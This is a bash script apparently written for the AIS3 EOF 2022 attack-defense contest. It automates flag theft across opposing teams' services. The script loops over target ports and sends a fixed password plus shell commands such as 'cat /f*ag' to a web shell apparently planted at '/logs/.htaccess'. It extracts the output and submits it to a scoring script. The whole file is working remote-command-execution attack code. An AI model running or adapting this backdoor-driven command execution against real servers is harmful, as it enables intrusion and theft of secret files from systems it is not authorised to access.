#!/bin/bash

for j in 1 `seq 18 42`
do
	i=$(( $j + 30000))
	flag=''
	flag=$(curl -s http://chals2.eof.ais3.org:$i/logs/.htaccess -F 'p=seadog007test1234' -F 'w=cat /f*ag' --connect-timeout 1 --max-time 1| grep -oP '# \K.*' | head -n1)
	bash /home/eof2022/score.sh "$j" "$flag" | jq .
	flag=$(curl -s http://chals2.eof.ais3.org:$i/logs/.htaccess -F 'p=seadog007test1234' -F 'w=cat /tmp/qwqwqwqwq' --connect-timeout 1 --max-time 1| grep -oP '# \K.*' | head -n1)
	bash /home/eof2022/score.sh "$j" "$flag" | jq .
done
